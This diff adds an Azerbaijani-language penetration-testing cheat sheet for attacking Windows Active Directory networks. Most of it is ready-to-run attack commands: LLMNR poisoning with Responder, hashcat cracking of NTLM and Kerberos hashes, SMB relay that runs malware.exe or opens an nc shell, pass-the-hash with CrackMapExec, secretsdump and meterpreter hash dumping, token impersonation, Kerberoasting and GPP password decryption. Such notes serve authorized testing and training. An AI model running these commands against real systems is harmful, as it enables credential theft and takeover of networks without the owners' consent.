@@ -1,0 +1,58 @@
+LLMNR (Link-Local Multicast Name Resolution) Poisoning, şəbəkədə DNS sorğularını əvəz edən LLMNR protokolunun zəifliklərindən istifadə edərək, istifadəçi adları və şifrələri oğurlamağa yönəlmiş hücum növüdür. Bu hücumda hücumçu saxta cavablar göndərərək qurbanın autentifikasiya məlumatlarını öz cihazına yönləndirir.
+responder -İ tun0 -rdwv
+ username::DOMAIN:lmhash:ntlmhash:timestamp
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
+5500 NetNTLMv1
+5500 NetNTLMv1+ESS
+5600 NetNTLMv2
+1000 NTLM
+__________________________________________________________________
+SMB Relay, qurbanın göndərdiyi NTLM autentifikasiya məlumatlarını ələ keçirərək onları başqa bir serverə təqdim etməklə hücumçunun həmin serverə giriş əldə etməsini təmin edən bir hücum növüdür. Bu hücum əsasən SMB protokolunun zəifliklərindən istifadə edərək autentifikasiya mexanizmini aldatmağa yönəlir.
+python3 responder.py -İ tun0 -rdwv
+uid:rid:lmhash:nthash
+impacket-ntlmrelayx -tf targets.txt -smb2support
+-i interactive session yaradacaq, ip və portu özü verəcək, nc ilə bağlanacağıq
+-e malware.exe  		-c "whoami"
+__________________________________________________________________
+Əlimizdə müyyən credentials varsa, bağlanmaq üçün:
+RDP Portu Açıqsa (3389):  xfreerdp /u:username /p:password /v:ip
+SMB Portu Açıqsa (445):  impacket-psexec  domain/user:password@ip
+SSH Portu Açıqsa  (22): ssh username@ip
+WinRM Portu Açıqsa(5985): evil-winrm -i ip -u username -p password
+__________________________________________________________________
+CrackMapExec (CME), Active Directory mühitlərində və Windows şəbəkələrində zəifliklərin və yanlış konfiqurasiyaların test edilməsi üçün istifadə olunan çoxfunksiyalı bir pentest vasitəsidir. O, xüsusilə SMB, RDP, WinRM kimi protokollar vasitəsilə istifadəçi parol məlumatlarını yoxlamaq, lateral hərəkətləri təhlil etmək və məlumat toplamaq üçün faydalıdır.
+crackmapexec protocol cidr -u username -d  domain -p password
+crackmapexec protocol cidr -u username -d  domain -H hash --local-auth
+__________________________________________________________________
+impacket-secretsdump domain/username:password@ip
+__________________________________________________________________
+meterpreter> hashdumps
+meterpreter> load incognito
+meterpreter > list_tokens -u
+meterpreter > impersonate_token "DOMAIN\\USERNAME"
+meterpreter> shell
+__________________________________________________________________
+Impacket-GetUserSPNs, Active Directory mühitlərində Kerberoasting hücumları üçün istifadə olunan bir vasitədir. Bu alət, Service Principal Names (SPN) təyin edilmiş istifadəçiləri tapır və onların xidmət biletlərini (TGS) çəkərək parol hash-lərini kəsmək üçün saxlayır.
+impacket-GetUserSPNs domain/user:password -dc-ip ip -request
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -0
+19600 | Kerberos 5, etype 17, TGS-REP                              
+  19800 | Kerberos 5, etype 17, Pre-Auth                            
+  28800 | Kerberos 5, etype 17, DB                                   
+  19700 | Kerberos 5, etype 18, TGS-REP                             
+  19900 | Kerberos 5, etype 18, Pre-Auth                             
+  28900 | Kerberos 5, etype 18, DB                                   
+   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      
+  13100 | Kerberos 5, etype 23, TGS-REP                              
+  18200 | Kerberos 5, etype 23, AS-REP
+__________________________________________________________________
+Smb portundu paylaşılanların arasında Replication varsa:
+smbclient \\\\ip\\Replication
+smb: \> prompt off
+smb: \> recurse on
+smb: \> ls
+smb: \> mget *
+Groups.xml faylını tapırıq və içərisindən name, cpassword-u tapırıq
+gpp-decrypt cpassword
+Ondan sonra impacket-psexec  və ya impacket-GetUserSPNs toolarını istifadə  edirik.
+__________________________________________________________________
+LDAP Pass-back Attack, LDAP (Lightweight Directory Access Protocol) serverlərində autentifikasiya sorğularının zəncirvari yönləndirilməsi zamanı baş verən bir hücum növüdür. Bu hücumda hücumçu, qurbanın autentifikasiya sorğusunu manipulyasiya edərək onu öz nəzarətində olan bir serverə yönləndirir və beləliklə, istifadəçi adlarını, şifrələri və digər həssas məlumatları ələ keçirə bilir.
